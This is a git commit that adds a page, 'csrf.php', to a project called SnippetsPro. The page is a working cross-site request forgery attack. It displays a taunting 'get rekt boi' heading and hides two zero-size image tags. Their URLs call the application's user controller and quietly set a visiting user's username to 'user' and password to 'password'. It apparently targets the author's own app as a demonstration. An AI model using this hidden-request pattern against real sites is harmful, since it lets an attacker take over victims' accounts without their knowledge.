206c0612ae26ae28c14d32bcc020b1a1ef8e0525
German Mikulski <mik.german@gmail.com>
2017-01-11 23:07:22 +0000

    Added csrf page

---
+++ SnippetsPro/csrf.php
@@ -0,0 +1,14 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<title>csrf</title>
+</head>
+<body>
+	<div>
+		<h1 style="text-align: center; color: red;">get rekt boi</h1>
+		<img style="width: 0px; height: 0px;" src="index.php?controller=user&action=set&type=username&value=user">
+		<img style="width: 0px; height: 0px;" src="index.php?controller=user&action=set&type=password&value=password">
+	</div>
+
+</body>
+</html>
